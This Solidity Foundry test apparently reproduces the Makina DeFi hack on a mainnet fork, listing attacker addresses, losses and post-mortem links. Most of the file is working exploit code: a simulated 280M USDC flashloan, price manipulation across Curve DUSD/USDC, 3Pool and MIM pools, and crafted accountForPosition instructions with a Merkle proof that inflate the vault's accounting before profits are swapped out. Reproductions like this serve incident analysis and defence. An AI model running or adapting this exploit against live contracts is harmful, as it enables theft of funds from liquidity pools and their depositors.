// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

// @KeyInfo - Total Lost : ~5.1M USDC (pool loss)
// The tx is front-run by a MEV bot.
// MEV : 0x935bfb495e33f74d2e9735df1da66ace442ede48
// MEV Contract : 0x454d03b2a1D52F5F7AabA8E352225335a1b724E8
// Real attacker : 0x2f934b0fd5c4f99bab37d47604a3a1aeadef1ccc
// Real attacker Contract : 0x2c19b916b29e5170f75628d690623dedcafeca4c
// Vulnerable Contracts :
//   - Caliber: 0xD1A1C248B253f1fc60eACd90777B9A63F8c8c1BC
//   - Machine: 0x6b006870C83b1Cd49E766Ac9209f8d68763Df721
//   - DUSD/USDC Pool: 0x32e616f4f17d43f9a5cd9be0e294727187064cb3
// Attack Tx : https://app.blocksec.com/phalcon/explorer/tx/eth/0x569733b8016ef9418f0b6bde8c14224d9e759e79301499908ecbcd956a0651f5

// Post-mortem : https://github.com/anon-cBE4/anon-cBE4/blob/main/writeups/makina_attack_analyze.md, https://www.quillaudits.com/blog/hack-analysis/makina-4m-hack-explained
// Twitter Alert : https://x.com/TenArmorAlert/status/2013460083078836342, https://x.com/CertiKAlert/status/2013473512116363734

contract MakinaExploitTest is Test {
    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant DUSD = 0x1e33E98aF620F1D563fcD3cfd3C75acE841204ef;

    address private constant DUSD_USDC_POOL = 0x32E616F4f17d43f9A5cd9Be0e294727187064cb3;
    address private constant THREE_POOL = 0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7;
    address private constant THREE_POOL_LP = 0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490;
    address private constant MIM_POOL = 0x5a6A4D54456819380173272A5E8E9B9904BdF41B;
    address private constant MIM = 0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3;

    address private constant CALIBER = 0xD1A1C248B253f1fc60eACd90777B9A63F8c8c1BC;
    address private constant MACHINE = 0x6b006870C83b1Cd49E766Ac9209f8d68763Df721;

    function setUp() public {
        vm.createSelectFork("mainnet", 24_273_362 - 1); // block before attack
        // ATTENSION: this script must run with --evm-version cancun (>= cancun)
    }

    function testMakinaExploitTest() public {
        // Flashloan 280M USDC
        uint256 usdcAmount = 280_000_000 * 1e6;
        deal(USDC, address(this), usdcAmount);
        console.log("Flashloan 280M USDC amount:", IERC20Minimal(USDC).balanceOf(address(this)));

        // Initial approvals
        IERC20Minimal(USDC).approve(DUSD_USDC_POOL, type(uint256).max);
        IERC20Minimal(USDC).approve(THREE_POOL, type(uint256).max);
        IERC20Minimal(DUSD).approve(DUSD_USDC_POOL, type(uint256).max);
        IERC20Minimal(THREE_POOL_LP).approve(MIM_POOL, type(uint256).max);
        IERC20Minimal(THREE_POOL_LP).approve(THREE_POOL, type(uint256).max);
        IERC20Minimal(MIM).approve(MIM_POOL, type(uint256).max);

        console.log("--- First Run ---");
        runExploit();
        console.log("--- Second Run ---");
        runExploit();

        // Repay 280M USDC flashloan
        console.log("--- Exploit Finish ---");
        uint256 finalBalance = IERC20Minimal(USDC).balanceOf(address(this));
        console.log("USDC before repay 280M USDC:", finalBalance);
        IERC20Minimal(USDC).transfer(address(0xdEaD), 280_000_000 * 1e6);
        finalBalance = IERC20Minimal(USDC).balanceOf(address(this));
        console.log("USDC after repay 280M USDC:", finalBalance);
        console.log("Final Profit in USDC: $", finalBalance / 1e6);
    }

    function runExploit() private {
        console.log("Step1: Spend 110M USDC in DUSD/USDC pool, make DUSD expansive");
        uint256[] memory amounts2 = new uint256[](2);
        amounts2[0] = 100_000_000 * 1e6;
        amounts2[1] = 0;
        ICurvePoolNG(DUSD_USDC_POOL).add_liquidity(amounts2, 0, address(this));
        ICurvePoolNG(DUSD_USDC_POOL).exchange(0, 1, 10_000_000 * 1e6, 0);

        console.log("Gain DUSD:", IERC20Minimal(DUSD).balanceOf(address(this)));
        console.log("Gain DUSD/USDC LP:", IERC20Minimal(DUSD_USDC_POOL).balanceOf(address(this)));

        console.log("Step2: Swap 170M USDC in 3Pool (Curve.fi: DAI/USDC/USDT Pool)");
        uint256[3] memory amounts3 = [uint256(0), 170_000_000 * 1e6, 0];
        ICurve3Pool(THREE_POOL).add_liquidity(amounts3, 0);
        console.log("Gain 3Crv:", IERC20Minimal(THREE_POOL_LP).balanceOf(address(this)));

        console.log("Step3: Spend 27M 3Crv in MIM/3Crv pool, make MIM expansive");
        uint256[2] memory mimAmounts = [uint256(0), 30_000_000 ether];
        ICurveMIM(MIM_POOL).add_liquidity(mimAmounts, 0);
        uint256 mimFromRemove = ICurveMIM(MIM_POOL).remove_liquidity_one_coin(15_000_000 ether, 0, 0);
        uint256 mimFromExchange = ICurveMIM(MIM_POOL).exchange(1, 0, 120_000_000 ether, 0);
        console.log("Gain MIM:", IERC20Minimal(MIM).balanceOf(address(this)));
        console.log("Gain MIM/3Crv LP:", IERC20Minimal(MIM_POOL).balanceOf(address(this)));

        console.log("Step4: Update Makina state, make DUSD expansive");
        call_accountForPosition();
        call_updateTotalAum();

        console.log("Step5: swap DUSD and LP to USDC, make profit from DUSD expansion");
        ICurvePoolNG(DUSD_USDC_POOL).exchange(1, 0, IERC20Minimal(DUSD).balanceOf(address(this)), 0);
        ICurvePoolNG(DUSD_USDC_POOL)
            .remove_liquidity_one_coin(IERC20Minimal(DUSD_USDC_POOL).balanceOf(address(this)), 0, 0);
        uint256 finalUSDC = IERC20Minimal(USDC).balanceOf(address(this));
        console.log("Final USDC balance (from DUSD pool part):", finalUSDC);
        console.log("Total Profit (from DUSD pool part): $", (int256(finalUSDC) - 110_000_000 * 1e6) / 1e6);

        console.log("Step6: swap MIM and LP to 3Crv, swap 3Crv to USDC");
        ICurveMIM(MIM_POOL).exchange(0, 1, mimFromExchange, 0);
        ICurveMIM(MIM_POOL).remove_liquidity_one_coin(IERC20Minimal(MIM_POOL).balanceOf(address(this)), 1, 0);
        ICurveMIM(MIM_POOL).exchange(0, 1, mimFromRemove, 0);
        uint256 total3Crv = IERC20Minimal(THREE_POOL_LP).balanceOf(address(this));
        ICurve3Pool(THREE_POOL).remove_liquidity_one_coin(total3Crv, 1, 0);
        finalUSDC = IERC20Minimal(USDC).balanceOf(address(this));
        console.log("Final USDC balance (After all steps):", finalUSDC);
        console.log("Total Profit (After all steps): $", (int256(finalUSDC) - 280_000_000 * 1e6) / 1e6);

        console.log("Step7: Reset Makina to original state for next run");
        call_accountForPosition();
        call_updateTotalAum();
    }

    function call_accountForPosition() private {
        address DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
        address USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
        address USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;

        address[] memory affectedTokens = new address[](3);
        affectedTokens[0] = DAI;
        affectedTokens[1] = USDC;
        affectedTokens[2] = USDT;

        bytes32[] memory commands = new bytes32[](11);
        commands[0] = 0x70a082310104ff0000000004fd5abf66b003881b88567eb9ed9c651f14dc4771;
        commands[1] = 0x6d5433e6010406ff00000004836c9007dbd73fcfc473190304c72b7e39babb91;
        commands[2] = 0xcc2b27d7810406ff000000845a6a4d54456819380173272a5e8e9b9904bdf41b;
        commands[3] = 0x62de91e9018405ff000000046e2ed2f457c41f38556ab0c2b1185cc9e6563d8d;
        commands[4] = 0x18160ddd01ff0000000000086c3f90f043a72fa612cbac8115ee7e52bde6e490;
        commands[5] = 0x4903b0d10105ff0000000005bebc44782c7db0a1a60cb6fe97d0b483032ff1c7;
        commands[6] = 0x4903b0d10106ff0000000006bebc44782c7db0a1a60cb6fe97d0b483032ff1c7;
        commands[7] = 0x4903b0d10107ff0000000007bebc44782c7db0a1a60cb6fe97d0b483032ff1c7;
        commands[8] = 0xaa9a091201050408ff000000836c9007dbd73fcfc473190304c72b7e39babb91;
        commands[9] = 0xaa9a091201060408ff000001836c9007dbd73fcfc473190304c72b7e39babb91;
        commands[10] = 0xaa9a091201070408ff000002836c9007dbd73fcfc473190304c72b7e39babb91;

        bytes[] memory state = new bytes[](9);
        state[0] = "";
        state[1] = "";
        state[2] = "";
        state[3] = abi.encode(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff);
        state[4] = hex"000000000000000000000000d1a1c248b253f1fc60eacd90777b9a63f8c8c1bc";
        state[5] = abi.encode(0x00000000000000000000000000000000);
        state[6] = abi.encode(0x00000000000000000000000000000001);
        state[7] = abi.encode(0x00000000000000000000000000000002);
        state[8] = "";

        bytes32[] memory merkleProof = new bytes32[](7);
        merkleProof[0] = 0xa7a3f0f3dbca12895d1f9424e8d0a924d50c92edfec3f817082763f73cb4cd5a;
        merkleProof[1] = 0xf326b46750aa6deec7344bb6f7243a395bcfde2680300e16f1bbff78672cbf3c;
        merkleProof[2] = 0x8c6626860a4b2368ed8caf9fd5b14b90d151c3ca390b7aff38dfe7003b5d421d;
        merkleProof[3] = 0x166be3838e86d1af766aeb93493d81b89e564c96c2f8decb94b400912de6afed;
        merkleProof[4] = 0xede17ea0feb39c3e2c3b900b4a95f239f010c251afb46a89984d868151c5b209;
        merkleProof[5] = 0xbf97f0d554ad3b05a210efb4de2a4930747e423e87b1fb139b63fcc94f17e286;
        merkleProof[6] = 0xae44b282d93e68621a7e6efa1e9b9893cc74b52a65196a60693a9e325c0fc401;

        ICaliberMinimal.Instruction memory instruction = ICaliberMinimal.Instruction({
            positionId: 329_781_725_403_426_819_283_923_979_544_582_973_776,
            isDebt: false,
            groupId: 0,
            instructionType: ICaliberMinimal.InstructionType.ACCOUNTING,
            affectedTokens: affectedTokens,
            commands: commands,
            state: state,
            stateBitmap: 41_206_067_869_332_392_060_018_018_868_690_681_856,
            merkleProof: merkleProof
        });

        (uint256 value, int256 change) = ICaliberMinimal(CALIBER).accountForPosition(instruction);

        console.log("accountForPosition value:", value);
        console.log("accountForPosition change:", change);
    }

    function call_updateTotalAum() private {
        (bool success, bytes memory data) = address(MACHINE).call(abi.encodeWithSignature("updateTotalAum()"));
        require(success, "updateTotalAum failed");
        uint256 aum = abi.decode(data, (uint256));
        console.log("total AUM:", aum);
    }
}

interface IERC20Minimal {
    function balanceOf(
        address account
    ) external view returns (uint256);
    function approve(
        address spender,
        uint256 amount
    ) external returns (bool);
    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);
}

interface ICurvePoolNG {
    function add_liquidity(
        uint256[] calldata amounts,
        uint256 min_mint_amount,
        address receiver
    ) external returns (uint256);
    function exchange(
        int128 i,
        int128 j,
        uint256 dx,
        uint256 minDy
    ) external returns (uint256);
    function remove_liquidity_one_coin(
        uint256 token_amount,
        int128 i,
        uint256 min_amount
    ) external returns (uint256);
}

interface ICurve3Pool {
    function add_liquidity(
        uint256[3] calldata amounts,
        uint256 min_mint_amount
    ) external;
    function remove_liquidity_one_coin(
        uint256 token_amount,
        int128 i,
        uint256 min_amount
    ) external;
}

interface ICurveMIM {
    function add_liquidity(
        uint256[2] calldata amounts,
        uint256 min_mint_amount
    ) external returns (uint256);
    function exchange(
        int128 i,
        int128 j,
        uint256 dx,
        uint256 minDy
    ) external returns (uint256);
    function remove_liquidity_one_coin(
        uint256 token_amount,
        int128 i,
        uint256 min_amount
    ) external returns (uint256);
}

interface ICaliberMinimal {
    enum InstructionType {
        MANAGEMENT,
        ACCOUNTING,
        HARVEST,
        FLASHLOAN_MANAGEMENT
    }

    struct Instruction {
        uint256 positionId;
        bool isDebt;
        uint256 groupId;
        InstructionType instructionType;
        address[] affectedTokens;
        bytes32[] commands;
        bytes[] state;
        uint128 stateBitmap;
        bytes32[] merkleProof;
    }

    struct Position {
        uint256 lastAccountingTime;
        uint256 value;
        bool isDebt;
    }

    function accountForPosition(
        Instruction calldata instruction
    ) external returns (uint256 value, int256 change);
}
